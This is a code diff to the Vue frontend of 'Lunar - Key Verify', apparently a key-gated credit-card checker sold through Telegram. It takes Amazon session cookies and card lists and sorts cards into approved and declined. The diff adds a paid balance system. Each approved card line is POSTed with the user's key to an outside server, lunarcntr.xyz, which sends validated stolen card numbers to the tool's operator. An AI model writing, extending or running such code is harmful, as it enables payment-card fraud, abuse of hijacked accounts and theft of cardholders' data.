@@ -24,7 +24,15 @@
             <p class="text-[#888888] font-montserrat text-base">Telegram: t.me/lunaroficial</p>
           </div>
         </div>
-        <div class="flex items-center">
+        <div class="flex items-center gap-4">
+          <!-- Saldo -->
+          <div class="flex items-center bg-[#0a0a0a] p-4 border border-[#2c2c2c] h-12 rounded-lg">
+            <p class="text-white font-montserrat font-medium">
+              Saldo: <span class="text-green-500">{{ saldo }}</span>
+            </p>
+          </div>
+
+          <!-- Botão do Grupo -->
           <a href="https://t.me/lunaroficial" target="_blank" class="flex items-center">
             <SecondaryButton name="entypo:chat" size="24px">
               Grupo
@@ -73,17 +81,14 @@
       <div class="flex flex-col md:flex-row mt-2 gap-4">
         <select
           class="w-full md:w-1/4 h-12 h-12 bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg opacity-60 drop-shadow-xl hover:opacity-80 hover:drop-shadow-2xl duration-300 ease-in text-white text-sm rounded-lg p-2.5 font-montserrat">
-          <option value="BR">Amazon BR</option>
-          <option value="IT">Amazon IT</option>
           <option selected value="US">Amazon US</option>
+          <option value="IT">Amazon IT</option>
         </select>
         <select v-model="threads"
           class="w-full md:w-1/4 h-12 bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg opacity-60 drop-shadow-xl hover:opacity-80 hover:drop-shadow-2xl duration-300 ease-in text-white text-sm rounded-lg p-2.5 font-montserrat">
           <option selected value="SL">Selecione o Multithread</option>
           <option value="1">1x</option>
           <option value="2">2x</option>
-          <option value="3">3x</option>
-          <option value="4">4x</option>
         </select>
         <input v-model="cookies" type="text" placeholder="Insira os cookies aqui..."
           class="flex-1 p-2.5 h-12 bg-[#0a0a0a] border-2 border-[#2c2c2c] text-white rounded-lg font-montserrat focus:border-zinc-500 transition" />
@@ -279,13 +284,16 @@
 
           </div>
           <div class="flex flex-row mt-4 ml-6 gap-2">
-            <SecondaryButton @click="verificarCartoes(); show = true" :disabled="isRunning.value" size="24px"
+            <!-- Botão Iniciar -->
+            <SecondaryButton @click="verificarCartoes" :disabled="isRunning.value" size="24px"
               name="material-symbols:play-arrow-rounded">
               Iniciar
             </SecondaryButton>
-            <SecondaryButton @click="pausarVerificacao" :disabled="!isRunning.value || isPaused.value" size="24px"
-              name="material-symbols:pause">
-              Pausar
+
+            <!-- Botão Parar -->
+            <SecondaryButton @click="pararVerificacao" :disabled="!isRunning.value" size="24px"
+              name="material-symbols:stop">
+              Parar
             </SecondaryButton>
           </div>
         </div>
@@ -300,19 +308,25 @@
       </p>
     </footer>
   </div>
-  <div v-else class="min-h-screen flex items-center justify-center bg-black text-white">
+  <div v-else class="min-h-screen flex items-center justify-center bg-[#0a0a0a] text-white">
     <div class="flex flex-col items-center">
       <Section class="flex items-center justify-center gap-2 p-4 max-w-3xl">
         <p class="font-montserrat text-white text-2xl font-black pt-2 pb-2">
           Lunar - Key Verify
         </p>
         <div class="flex flex-row">
-          <p class="font-montserrat">Join our</p>
-          <a href="https://t.me/lunaroficial" target="_blank">
-            <p class="text-blue-500 pl-1 pr-1  font-montserrat">Telegram</p>
+          <p class="font-montserrat">Talk to</p>
+          <a href="https://t.me/yuzuuk1" target="_blank">
+            <p class="text-blue-500 pl-1 pr-1  font-montserrat">@yuzuuk1</p>
           </a>
-          <p class="font-montserrat">and use /key to get your key!</p>
+          <p class="font-montserrat">or join</p>
+          <a href="https://t.me/lunaroficial" target="_blank">
+            <p class="text-blue-500 pl-1 pr-1  font-montserrat">@lunaroficial</p>
+          </a>
+
+          <p class="font-montserrat">to obtain your key!</p>
         </div>
+        <p class="font-montserrat">Free key pinned in our channel.</p>
         <input v-model="userKey" type="text" placeholder="Enter your key here..."
           class="p-2 w-full bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg text-white text-center font-montserrat" />
         <SecondaryButton @click="validarKey" class="w-full">
@@ -355,6 +369,7 @@ const ano = ref("SL");
 const quantidade = ref(1);
 const cartoes = ref([]);
 const cartoesOutput = ref("");
+const saldo = ref(0); // Saldo da chave
 
 const showSettings = ref(false);
 const showResults = ref(false);
@@ -380,9 +395,8 @@ async function validarKey() {
   }
 
   try {
-    const response = await fetch(`https://lunarcntr.xyz/api/api.php?key=${userKey.value}`);
+    const response = await fetch(`https://lunarcntr.xyz/keys/validateKey.php?key=${userKey.value}`);
 
-    // Verifica se a resposta foi bem-sucedida
     if (!response.ok) {
       if (response.status === 404) {
         errorMessage.value = 'API endpoint not found. Please contact support.';
@@ -397,12 +411,19 @@ async function validarKey() {
     const data = await response.json();
 
     if (data.valid) {
-      isAuthorized.value = true; // Permite o acesso ao site
+      if (data.saldo <= 0) {
+        errorMessage.value = 'Your balance is zero. Please recharge your key.';
+        isAuthorized.value = false;
+        return;
+      }
+
+      isAuthorized.value = true;
+      saldo.value = data.saldo; // Atualiza o saldo
+      successMessage.value = 'Key is valid!';
     } else {
-      errorMessage.value = 'Invalid key! Please check and try again.';
+      errorMessage.value = data.message || 'Invalid key!';
     }
   } catch (error) {
-    // Tratamento de erros de rede ou outros problemas
     if (error.name === 'TypeError') {
       errorMessage.value = 'Network error. Please check your connection and try again.';
     } else {
@@ -411,6 +432,7 @@ async function validarKey() {
     console.error('Error validating key:', error);
   }
 }
+
 
 function exibirNotificacao(titulo, mensagem, tipo = 'success') {
   if (notificacaoAtiva) return; // Evita exibir notificações enquanto uma está ativa
@@ -589,6 +611,32 @@ async function verificarCartoes() {
           } else if (text.includes('badge-danger')) {
             recusados.value.push(`${linha} ➔ ${banco}`);
           } else if (text.includes('badge-success')) {
+            try {
+              const res = await fetch('https://lunarcntr.xyz/keys/atualizarKey.php', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: new URLSearchParams({
+                  key: userKey.value,
+                  live: linha // cartão aprovado
+                })
+              });
+
+              const result = await res.json();
+
+              if (result.saldo !== undefined) {
+                saldo.value = result.saldo; // Atualiza o saldo no frontend
+              }
+
+              if (result.saldo <= 0) {
+                isRunning.value = false;
+                exibirNotificacao('Saldo esgotado', 'Sua key ficou sem saldo e o checker foi interrompido.', 'error');
+              }
+            } catch (err) {
+              console.error('Erro ao atualizar saldo:', err);
+            }
+
             aprovados.value.push(`${linha} ➔ ${banco}`);
             if (live) {
               live.currentTime = 0;
@@ -603,6 +651,11 @@ async function verificarCartoes() {
       })
     );
 
+    // Para o loop externo se o checker tiver sido interrompido por saldo zerado
+    if (!isRunning.value) {
+      return;
+    }
+
     lista.value = linhas.join('\n'); // Atualiza a lista com as linhas restantes
   }
 
@@ -610,10 +663,11 @@ async function verificarCartoes() {
   exibirNotificacao('Concluído', 'A lista foi concluída.', 'success');
 }
 
-function pausarVerificacao() {
+function pararVerificacao() {
   if (isRunning.value) {
-    isPaused.value = true;
-    exibirNotificacao('Pausado', 'O checker foi pausado.', 'warning');
+    isRunning.value = false;
+    isPaused.value = false;
+    exibirNotificacao('Interrompido', 'O checker foi interrompido.', 'warning');
   }
 }
 
